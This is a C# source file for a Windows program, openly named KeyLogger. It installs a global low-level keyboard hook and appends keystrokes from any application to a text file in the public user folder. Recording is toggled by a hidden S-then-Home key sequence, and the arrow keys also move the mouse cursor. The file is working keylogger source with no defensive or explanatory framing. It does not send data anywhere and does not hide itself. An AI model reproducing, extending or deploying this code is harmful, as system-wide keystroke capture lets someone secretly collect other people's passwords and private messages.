using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.Drawing;

namespace KeyLogger
{
    class KeyLog
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYUP = 0x0101;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        static System.Text.StringBuilder logFile = new System.Text.StringBuilder();
        private static bool SHIFT_DOWN = false;
        private static bool Record = false;


        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
            {
                int vkCode = Marshal.ReadInt32(lParam);


                if (((Keys)vkCode).ToString() == "S")
                {
                    SHIFT_DOWN = true;
                }
                else if (SHIFT_DOWN && ((Keys)vkCode).ToString() == "Home")
                {
                    if (!Record)
                    {
                        Record = true;
                    }
                    else if (Record)
                    {
                        Record = false;
                    }
                }

                else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
                {
                    SHIFT_DOWN = false;
                }

                if (((Keys)vkCode).ToString() == "OemPeriod" && Record)
                {
                    Console.WriteLine((Keys)vkCode);
                    StreamWriter output = new StreamWriter(@"C:\Users\Public\logfile.txt", true);
                    output.Write(" .");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma" && Record)
                {
                    Console.WriteLine((Keys)vkCode);
                    StreamWriter output = new StreamWriter(@"C:\Users\Public\logfile.txt", true);
                    output.Write(" ,");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Space" && Record)
                {
                    Console.WriteLine((Keys)vkCode);
                    StreamWriter output = new StreamWriter(@"C:\Users\Public\logfile.txt", true);
                    output.Write(" ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Return" && Record)
                {
                    Console.WriteLine((Keys)vkCode);
                    StreamWriter output = new StreamWriter(@"C:\Users\Public\logfile.txt", true);
                    output.Write("Enter ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "OemQuestion" && Record)
                {
                    Console.WriteLine((Keys)vkCode);
                    StreamWriter output = new StreamWriter(@"C:\Users\Public\logfile.txt", true);
                    output.Write("? ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Up")
                {
                    ;
                }
                else if (((Keys)vkCode).ToString() == "Down")
                {
                    ;
                }
                else if (((Keys)vkCode).ToString() == "Left")
                {
                    ;
                }
                else if (((Keys)vkCode).ToString() == "Right")
                {
                    ;
                }
                else if (Record)
                {
                    Console.WriteLine((Keys)vkCode);
                    StreamWriter output = new StreamWriter(@"C:\Users\Public\logfile.txt", true);
                    output.Write((Keys)vkCode + " ");
                    output.Close();
                }
            }
            
            else if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                if (((Keys)vkCode).ToString() == "Up")
                {
                    Cursor.Position = new Point(Cursor.Position.X, Cursor.Position.Y - 5);
                }
                if (((Keys)vkCode).ToString() == "Down")
                {
                    Cursor.Position = new Point(Cursor.Position.X, Cursor.Position.Y + 5);
                }
                if (((Keys)vkCode).ToString() == "Left")
                {
                    Cursor.Position = new Point(Cursor.Position.X - 5, Cursor.Position.Y);
                }
                if (((Keys)vkCode).ToString() == "Right")
                {
                    Cursor.Position = new Point(Cursor.Position.X + 5, Cursor.Position.Y);
                }
                else
                {
                    ;
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }


        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);

        [DllImport("user32.dll")]
        public static extern bool UnregisterHotKey(IntPtr hWnd, int id);

    }
}
